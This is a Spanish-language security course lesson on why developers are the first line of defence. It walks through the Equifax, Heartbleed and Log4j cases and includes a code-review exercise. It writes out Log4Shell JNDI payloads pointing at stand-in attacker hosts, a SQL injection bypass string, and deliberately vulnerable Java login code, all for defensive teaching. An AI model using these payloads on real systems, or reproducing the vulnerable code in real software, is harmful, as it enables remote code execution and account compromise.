# Clase 2: El Rol del Desarrollador en Ciberseguridad

**Duracion:** 2 horas

---

## Objetivos de Aprendizaje

1. Comprender por que los desarrolladores son la primera linea de defensa en ciberseguridad
2. Conocer estadisticas actuales de vulnerabilidades en software
3. Analizar casos reales de brechas de seguridad causadas por errores de desarrollo
4. Identificar vulnerabilidades comunes en codigo fuente

---

## Contenido Detallado

### 1. Por que los Desarrolladores son la Primera Linea de Defensa

Historicamente, la seguridad era responsabilidad exclusiva del equipo de operaciones o seguridad. Este enfoque falla porque:

- El 75% de las vulnerabilidades se introducen en la fase de codificacion (fuente: IBM)
- Corregir una vulnerabilidad en produccion cuesta 30x mas que en desarrollo
- Los desarrolladores toman decisiones diarias que afectan la seguridad: como se almacenan datos, como se validan entradas, como se manejan sesiones

**El cambio de paradigma: "Shift Left"**

```
Modelo Tradicional:
Requisitos -> Diseno -> Codigo -> Pruebas -> Seguridad -> Produccion
                                                        ^
                                              (aqui se encuentra el problema)

Modelo Shift Left:
Seguridad -> Requisitos -> Diseno -> Codigo -> Pruebas -> Produccion
    ^            ^           ^        ^          ^
    |            |           |        |          |
    +--- Seguridad integrada desde el inicio
```

### 2. Estadisticas Actuales de Vulnerabilidades

| Estadistica | Fuente |
|------------|--------|
| 27,000+ vulnerabilidades reportadas en 2023 | NVD (NIST) |
| 76% de las apps tienen al menos una vulnerabilidad | Veracode State of Software Security |
| Tiempo promedio para corregir una vulnerabilidad: 171 dias | IBM X-Force |
| 43% de las brechas involucran aplicaciones web | Verizon DBIR 2023 |
| 84% de las apps tienen al menos una vulnerabilidad de alto riesgo | WhiteHat Security |
| El costo promedio de una brecha de datos: $4.45 millones | IBM Cost of Data Breach 2023 |

### 3. Responsabilidades del Desarrollador

| Responsabilidad | Descripcion | Ejemplo |
|----------------|------------|---------|
| **Codigo Seguro** | Escribir codigo que no introduzca vulnerabilidades | Usar consultas parametrizadas, no concatenar SQL |
| **Manejo Seguro de Datos** | No exponer datos sensibles en logs, URLs, respuestas | No loguear passwords, no mostrar tarjetas completas |
| **Autenticacion y Sesiones** | Implementar autenticacion robusta y manejo seguro de sesiones | Usar bcrypt para passwords, HttpOnly para cookies |
| **Validacion de Entradas** | Nunca confiar en datos del usuario | Sanitizar inputs, validar en servidor y cliente |
| **Dependencias Seguras** | Mantener librerias actualizadas y sin vulnerabilidades conocidas | Usar npm audit, OWASP Dependency Check |

### 4. Casos Reales de Brechas por Errores de Desarrollo

#### Caso Equifax (2017)
- **Que paso:** Brecha que expuso datos de 147 millones de personas
- **Causa:** Vulnerabilidad en Apache Struts (CVE-2017-5638) que permitia ejecucion remota de codigo
- **Error del desarrollador:** No aplicar el parche disponible desde hace 2 meses
- **Leccion:** La gestion de parches y el monitoreo de dependencias es critico
- **Costo:** $1.4 mil millones en multas y compensaciones

#### Caso Heartbleed (2014)
- **Que paso:** Vulnerabilidad en OpenSSL (CVE-2014-0160)
- **Causa:** Falta de validacion de limites en la extension Heartbeat de OpenSSL. Un atacante podia leer memoria del servidor (incluyendo claves privadas)
- **Leccion:** La validacion de buffers es esencial; el software de codigo abierto tambien necesita auditoria
- **Impacto:** Afecto al 17% de los servidores HTTPS del mundo

```
Heartbeat normal:
Cliente: "Hola, estoy vivo" [longitud: 5]  -->  Servidor: "Hola, estoy vivo" [longitud: 5]

Heartbeat malicioso:
Cliente: "Hola" [longitud: 65535]  -->  Servidor: "Hoja...[datos de memoria privada]..."
```

#### Caso Log4j (2021)
- **Que paso:** Vulnerabilidad critica (CVE-2021-44228) en la libreria de logging Log4j de Apache
- **Causa:** Log4j permitia evaluacion remota de expresiones JNDI/LDAP al loguear ciertos strings
- **Vector de ataque:** Enviar un string como `${jndi:ldap://servidor-atacante/a}` en cualquier campo que se logueara (User-Agent, nombre de usuario, etc.)
- **Leccion:** Nunca ejecutar codigo remoto basado en entrada del usuario; revisar dependencias
- **Impacto:** Afecto a millones de servidores; parche de emergencia en 24 horas

```
Log4j vulnerable:
logger.info("Usuario: " + nombreUsuario);
// Si nombreUsuario = "${jndi:ldap://malo.com/exploit}"
// Log4j descarga y ejecuta clases desde malo.com

Log4j parcheado (v2.17.0):
- Se deshabilito JNDI por defecto
- Se anadio "-Dlog4j2.formatMsgNoLookups=true"
- Se limitaron los protocolos permitidos
```

---

## Ejercicio 1: Analisis del Caso Log4j

Responder en grupos las siguientes preguntas:

1. **Que vulnerabilidad exploto Log4Shell (CVE-2021-44228)?**
2. **Cual fue el vector de ataque principal?**
3. **Como se pudo prevenir desde el desarrollo?**
4. **Que lecciones aprendio la industria de este incidente?**

### Solucion

1. Log4Shell explota la capacidad de Log4j de realizar sustitucion de mensajes con lookups JNDI. Cuando Log4j loguea un string que contiene `${jndi:ldap://...}`, realiza una consulta LDAP que puede devolver una clase Java remota que se ejecuta en el servidor. Esto permite ejecucion remota de codigo (RCE).

2. El vector de ataque principal era cualquier entrada del usuario que fuera registrada por la aplicacion. Los atacantes enviaban peticiones HTTP con el payload malicioso en headers como `User-Agent`, `X-Forwarded-For`, parametros GET/POST, o incluso en el nombre de usuario durante el login. Al ser logueados, se activaba la vulnerabilidad.

3. Prevencion desde el desarrollo:
   - No loguear directamente entradas del usuario sin sanitizacion
   - Usar la version mas reciente de Log4j (2.17.0+)
   - Configurar `log4j2.formatMsgNoLookups=true`
   - Eliminar la clase JndiLookup del classpath
   - Usar SLF4J con implementacion alternativa (Logback)
   - Implementar lista blanca de protocolos remotos

4. Lecciones aprendidas:
   - Las dependencias de codigo abierto requieren revision de seguridad
   - El logging no es inocuo: puede ser vector de ataque
   - La sustitucion de variables en mensajes puede ser peligrosa
   - Es necesario tener un SBOM (Software Bill of Materials) actualizado
   - La respuesta rapida requiere canales de comunicacion establecidos

---

## Ejercicio 2: Revision de Codigo Vulnerable

El siguiente fragmento de codigo en Java tiene 5 vulnerabilidades. Identifiquelas y proponga correcciones.

```java
public class UserController {
    Connection conn = DriverManager.getConnection(
        "jdbc:mysql://localhost:3306/tienda", "root", "admin123");

    public boolean login(String user, String pass) {
        String query = "SELECT * FROM usuarios WHERE user='" + user
                     + "' AND pass='" + pass + "'";
        Statement stmt = conn.createStatement();
        ResultSet rs = stmt.executeQuery(query);
        return rs.next();  // Si existe el usuario, login exitoso
    }

    public void guardarUsuario(String user, String pass) {
        String hashedPass = pass;  // Sin hash
        String query = "INSERT INTO usuarios VALUES('" + user + "','" + hashedPass + "')";
        Statement stmt = conn.createStatement();
        stmt.executeUpdate(query);
    }
}
```

### Vulnerabilidades Identificadas

| # | Vulnerabilidad | Explicacion | Correccion |
|---|---------------|-------------|------------|
| 1 | **Inyeccion SQL** | Concatenacion directa de strings en query SQL. Atacante puede enviar `' OR '1'='1` como pass para bypassear autenticacion | Usar PreparedStatement con consultas parametrizadas |
| 2 | **Contrasena hardcodeada** | La contrasena de la BD `admin123` esta escrita en el codigo fuente | Usar variables de entorno o un vault de secretos |
| 3 | **Contrasenas en texto plano** | La contrasena del usuario se almacena sin hashing | Usar bcrypt/Argon2 para hashear contrasenas |
| 4 | **DriverManager sin manejo seguro** | No cierra conexiones ni maneja excepciones | Usar try-with-resources y connection pooling |
| 5 | **Conexion sin SSL** | La URL no especifica SSL para la conexion a BD | Agregar `?useSSL=true&requireSSL=true` |

### Codigo Corregido

```java
import java.sql.*;
import org.mindrot.jbcrypt.BCrypt;

public class UserControllerSeguro {
    private static final String DB_URL = System.getenv("DB_URL");
    private static final String DB_USER = System.getenv("DB_USER");
    private static final String DB_PASS = System.getenv("DB_PASS");

    public boolean login(String user, String pass) {
        String query = "SELECT pass_hash FROM usuarios WHERE user = ?";
        try (Connection conn = DriverManager.getConnection(DB_URL, DB_USER, DB_PASS);
             PreparedStatement stmt = conn.prepareStatement(query)) {
            stmt.setString(1, user);
            ResultSet rs = stmt.executeQuery();
            if (rs.next()) {
                return BCrypt.checkpw(pass, rs.getString("pass_hash"));
            }
            return false;
        } catch (SQLException e) {
            // Loggear sin exponer datos sensibles
            System.err.println("Error en login: " + e.getMessage());
            return false;
        }
    }

    public boolean guardarUsuario(String user, String pass) {
        String query = "INSERT INTO usuarios (user, pass_hash) VALUES (?, ?)";
        try (Connection conn = DriverManager.getConnection(DB_URL, DB_USER, DB_PASS);
             PreparedStatement stmt = conn.prepareStatement(query)) {
            stmt.setString(1, user);
            stmt.setString(2, BCrypt.hashpw(pass, BCrypt.gensalt()));
            return stmt.executeUpdate() > 0;
        } catch (SQLException e) {
            System.err.println("Error al guardar usuario: " + e.getMessage());
            return false;
        }
    }
}
```

---

## Preguntas y Respuestas

### Pregunta 1
**Por que se dice que los desarrolladores son la primera linea de defensa? No deberian ser los equipos de seguridad?**

**Respuesta:** Si bien los equipos de seguridad son cruciales, los desarrolladores toman decisiones fundamentales durante la codificacion que determinan si una vulnerabilidad existe o no. Ejemplos: elegir entre concatenar SQL vs usar parametros, decidir como almacenar contrasenas, determinar que datos se exponen en APIs. El equipo de seguridad no puede revisar cada linea de codigo. Estadisticamente, el 75% de las vulnerabilidades se introducen en la codificacion. Si los desarrolladores no escriben codigo seguro desde el inicio, el equipo de seguridad esta en desventaja.

### Pregunta 2
**Que es "Shift Left" y por que es importante?**

**Respuesta:** "Shift Left" significa mover las actividades de seguridad a las primeras fases del ciclo de desarrollo (la "izquierda" del cronograma). En lugar de probar seguridad al final (cuando es mas caro corregir), se integra desde los requisitos y el diseno. Es importante porque corregir una vulnerabilidad en produccion cuesta hasta 30 veces mas que corregirla en la fase de diseno o codificacion temprana.

### Pregunta 3
**Cual fue la causa raiz de Heartbleed y que leccion deja a los desarrolladores?**

**Respuesta:** La causa raiz fue una falta de validacion de limites (bounds checking) en la implementacion de la extension Heartbeat de OpenSSL. El servidor confiaba en la longitud declarada por el cliente sin verificar que coincidiera con el tamano real del mensaje. Esto permitia leer hasta 64KB de memoria del servidor. La leccion: toda entrada del usuario debe ser validada, especialmente los tamanos y longitudes declarados. Nunca confiar en valores proporcionados por el cliente.

### Pregunta 4
**Que es un SBOM y que relacion tiene con casos como Log4j?**

**Respuesta:** SBOM (Software Bill of Materials) es un inventario detallado de todos los componentes, librerias y dependencias que componen una aplicacion. Con el SBOM, cuando se descubre una vulnerabilidad como Log4j, un equipo puede identificar inmediatamente que aplicaciones usan la version afectada. Sin SBOM, las organizaciones pasan dias o semanas buscando manualmente que sistemas estan vulnerables. Despues de Log4j, el SBOM se volvio una practica recomendada y exigida por gobiernos (EE.UU. EO 14028).

### Pregunta 5
**Es seguro usar librerias de codigo abierto? Como mitigar los riesgos?**

**Respuesta:** Usar codigo abierto no es inherentemente inseguro, pero introduce riesgos que deben gestionarse. Las mitigaciones incluyen: (1) mantener un SBOM actualizado, (2) usar herramientas de escaneo de dependencias como OWASP Dependency Check, Snyk, o GitHub Dependabot, (3) suscribirse a listas de seguridad de las librerias clave, (4) aplicar parches de seguridad en un plazo definido (ej: 48h para criticos), (5) evaluar la madurez del proyecto (frecuencia de commits, respuesta a issues de seguridad), (6) considerar el "fork" y mantenimiento interno de librerias criticas.

---

## Tarea / Lectura Recomendada

1. **Leer:** OWASP Secure Coding Practices Quick Reference Guide
2. **Ver:** Video "Log4j Explained" por John Hammond (YouTube)
3. **Investigar:** Leer sobre el caso SolarWinds (2020) y analizar como errores de desarrollo permitieron el ataque a la cadena de suministro
4. **Practicar:** Configurar Snyk o GitHub Dependabot en un proyecto personal y analizar el reporte de vulnerabilidades
5. **Profundizar:** Leer "The Developer's Role in Cybersecurity" (articulo de SANS Institute)
